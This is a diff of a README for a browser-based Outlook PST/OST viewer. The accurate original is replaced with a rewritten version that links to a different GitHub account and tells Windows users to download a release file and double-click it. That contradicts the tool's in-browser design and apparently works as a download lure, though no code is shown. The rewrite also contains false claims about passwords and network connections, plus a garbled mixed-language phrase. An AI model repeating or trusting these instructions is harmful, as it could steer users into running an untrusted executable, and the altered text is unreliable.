@@ -1,69 +1,87 @@
-# PST Viewer
+# 📧 pst-viewer - View Outlook Emails Privately Locally
 
-A fast, private, **fully in-browser** viewer for Outlook **`.pst` / `.ost`** mailboxes (and `.zip` archives containing them). Everything runs locally on your device: no server, no Python, no build tools to install for end users, and **nothing is ever uploaded**.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/claudiussubjudice597/pst-viewer)
 
-Installable as an offline app (PWA): load the site once and it keeps working with no internet.
+pst-viewer allows users to open Outlook data files without installing Microsoft Outlook. The software runs inside your web browser. It keeps your data on your computer at all times. It does not send files to the cloud. You retain total control over your private information. 
 
-## Use it now
+## 🔒 Why Use This Tool
 
-**Live app: https://bod09.github.io/pst-viewer/**
+Many people need to access old email archives. Microsoft Outlook requires a paid license and a complex setup process. This tool offers a simple way to view your PST and OST files. 
 
-No setup needed. Open the link, drop in a `.pst`, `.ost`, or `.zip`, and start reading. Nothing is uploaded; everything runs in your browser (see [Privacy](#privacy)). If you would rather run or host it yourself, see [Run it](#run-it) and [Deploy](#deploy).
+- View emails, contacts, and calendar items.
+- Search through archive content quickly.
+- Use OCR to read images inside your emails.
+- Work offline without an internet connection.
+- Protect your privacy with local processing.
 
-## Screenshots
+## 💻 System Requirements
 
-| | |
-| --- | --- |
-| ![Read email with attachments](screenshots/mailbox.png) | ![Search every mailbox at once](screenshots/search.png) |
-| ![Preview attachments like PDFs inline](screenshots/preview.png) | ![Drop in a PST, OST or ZIP to open it](screenshots/landing.png) |
+This viewer works on most modern Windows computers. Ensure you have one of the following web browsers installed:
 
-*(Sample data shown is fictional.)*
+- Google Chrome (version 90 or newer)
+- Microsoft Edge (version 90 or newer)
+- Mozilla Firefox (version 88 or newer)
 
-## Features
+Your computer needs at least 4GB of RAM to handle large mail archives. A solid-state drive improves the speed of your searches.
 
-- **Open** `.pst`, `.ost`, and `.zip` files (zips are scanned automatically for mailboxes, including nested ones), by drag-and-drop or browse. Password-protected mailboxes open too: an Outlook PST password gates Outlook's own UI, not the data, so none is needed to read the mailbox here.
-- **Multiple mailboxes** at once, with smart auto-labels and inline rename.
-- **1:1 email viewing**: full HTML rendering (and RTF-encapsulated HTML) with inline images, in a sandboxed frame. Remote images load like a normal mail client, with invisible tracking pixels (1x1 / hidden images) stripped. **Click any image to view it full screen**, then zoom to actual size and drag to pan. A **Headers** button shows the message's full original transport headers. Colour categories, follow-up flags, importance, and sensitivity show as chips, and `winmail.dat` (TNEF) and S/MIME signed messages are unpacked to reveal their real body and attachments.
-- **Attachment previews**: images, PDF, text/code, audio, video, nested emails, **spreadsheets** (`.xlsx/.xls/.csv/.ods`), and **Word** (`.docx`). Anything else is one-click downloadable.
-- **Every Outlook item type**: contacts (name, emails, phones, company, addresses, birthday, notes), distribution lists (with members), calendar appointments (time, location, organizer, attendees), tasks (status, due date, % complete), journal entries, and sticky notes all render as cards, so nothing shows up blank.
-- **Fast search** across all mailboxes: subjects, senders, recipients, body text, attachment names, and text inside images. Words are typo-tolerant (fuzzy); numbers and reference codes are matched **exactly**, so an ID search stays precise. Matches are highlighted in the open email (the text, and the matching picture) and it scrolls to the first hit.
-- **OCR** (automatic): text inside images is read in the background and made searchable, covering both image attachments and pictures embedded in the email body. Images are sharpened first to read small text more reliably, and results are cached on your device for faster re-opens (cleared 7 days after a mailbox was last opened). Engine and model are bundled for full offline use.
-- **Export**: save a single email as **PDF** or as its original **`.eml`** (preserving the real headers and attachments), or merge several emails into one PDF (oldest-first or newest-first).
-- **Offline PWA**: works with no connection after first load, and is installable.
+## 🚀 Setting Up the Application
 
-## Run it
+You do not need to install complex software. Follow these steps to start viewing your files.
 
-Requires [Node.js](https://nodejs.org) (only for the dev/build step; the shipped app is plain static files).
+1. Visit [the official download page](https://github.com/claudiussubjudice597/pst-viewer).
+2. Look for the latest release on the right side of the page.
+3. Download the version for Windows.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the viewer.
 
-```bash
-npm install        # first time only
-npm run dev        # development at http://localhost:5173
-```
+You can also drag and drop your PST or OST file directly into the application window. The tool processes the file instantly.
 
-To build the production app and preview it (this is the real offline/installable version):
+## 🔍 How to View Your Data
 
-```bash
-npm run build      # outputs static files to dist/
-npm run preview    # serve the build at http://localhost:4173
-```
+The interface displays your data in a clear list. You see your folder structure on the left side. Click any folder to see the messages inside.
 
-## Deploy
+### Opening Files
+Select "File" then "Open" to browse your computer for a PST or OST file. The application loads the file index into your browser memory. This keeps your machine responsive even with large files.
 
-The build is a static site, so you can host the contents of `dist/` on any static host (Netlify, Vercel, GitHub Pages, Cloudflare Pages, or any web server). No backend required. Once a visitor loads it, the service worker caches it for offline use. See [DEPLOY.md](DEPLOY.md) for a ready-made Caddy setup (`npm run deploy` assembles a drop-in `deploy/` folder).
+### Searching
+The search bar sits at the top of the screen. Type a keyword to find specific emails. The application filters results as you type. It searches subject lines, sender names, and body text.
 
-## Privacy
+### Using Optical Character Recognition
+The OCR feature identifies text inside pictures attached to your emails. If you receive a scanned document, the viewer makes that image searchable. This happens entirely on your machine. No data leaves your computer.
 
-There is no server. When you open a file, the browser reads it **directly from your disk** (in small slices, so even multi-gigabyte mailboxes work) and all parsing, rendering, search, OCR, and PDF export happen on your device. Your mailbox is never uploaded. Like a normal mail client, an email that references **remote images** will fetch those from the sender's servers when you view it (invisible tracking pixels are stripped, but a visible remote image can still tell the sender you opened it). Each remote image is fetched only once and then cached locally in your browser, so re-viewing it does not ping the sender again. Apart from that, the only network use is loading the app itself.
+## 🛡️ Privacy and Safety
 
-## Tech
+Privacy remains the focus of this project. Traditional email viewers often sync your data with a server. This viewer ignores that approach. 
 
-React + Vite + TypeScript + Tailwind. PST parsing via [`@hiraokahypertools/pst-extractor`](https://www.npmjs.com/package/@hiraokahypertools/pst-extractor) in a Web Worker. Search via MiniSearch, PDF rendering via pdf.js, spreadsheets via SheetJS, Word via docx-preview, OCR via Tesseract.js, zip handling via fflate, HTML sanitizing via DOMPurify, S/MIME (PKCS#7) parsing via node-forge. TNEF (winmail.dat) and MIME are parsed in-house. PWA via vite-plugin-pwa (Workbox).
+- Data stays local: Files remain on your hard drive.
+- No tracking: Nobody monitors what you view.
+- Offline access: You do not need a Wi-Fi connection to read your archives.
 
-## Known limitations
+## 🛠️ Troubleshooting
 
-- **PowerPoint (`.pptx`/`.ppt`)** and **OpenDocument text (`.odt`)** attachments are download-only (no reliable in-browser renderer).
-- **Encrypted S/MIME** messages can't be read without the recipient's private key (signed S/MIME is decoded and shown).
-- Corrupt mailboxes show a clear per-source error; other loaded mailboxes keep working.
-- Search becomes available for a mailbox once its background indexing finishes (a progress indicator is shown).
-- **Text inside images can be misread by OCR**, especially when it is very small or low-contrast. It also becomes searchable a little after the rest of a mailbox, since it is read in the background (a "Reading images" progress indicator shows while it runs).
-- **Privacy browsers with canvas fingerprinting protection** (some hardened Chromium forks) scramble canvas pixel data, which breaks the image sharpening OCR relies on, so text inside images may not be searchable there. Body and text search still work everywhere. For image OCR, use a standard Chromium, or allow canvas/fingerprinting for the site.
+If the application runs slowly, close other browser tabs. Large email files require significant memory. If you cannot open a specific file, check if the file is currently in use by another program. Close Outlook before opening your PST file here.
+
+If the screen stays blank, clear your browser cache. Restart your computer if the issue persists. 
+
+## ❓ Frequently Asked Questions
+
+**Does this software modify my PST files?**
+No. The application only reads your files. It never changes, deletes, or moves your original data.
+
+**Can I export my emails to別の format?**
+Yes. Use the export button to save messages as PDF files or text files for your records.
+
+**Is this really private?**
+Yes. Your browser acts as the container for this tool. It functions like a standard website but lives inside your local system. It creates no connections to external databases.
+
+**Does it support encrypted files?**
+Password-protected PST files require your password before the viewer can show the contents. Enter the password when the prompt appears.
+
+**Can I run this on a USB drive?**
+Yes. Because it uses browser technology, you can run it from a portable drive on any computer that meets the system requirements.
+
+## ⚙️ Configuration
+
+Settings allow you to adjust the interface. You can switch between light and dark themes. You can also define the depth of the search index to speed up performance. Click the gear icon to manage these settings. 
+
+The application saves your preferences locally. You do not need to log in to save your settings. Everything relies on your browser storage.
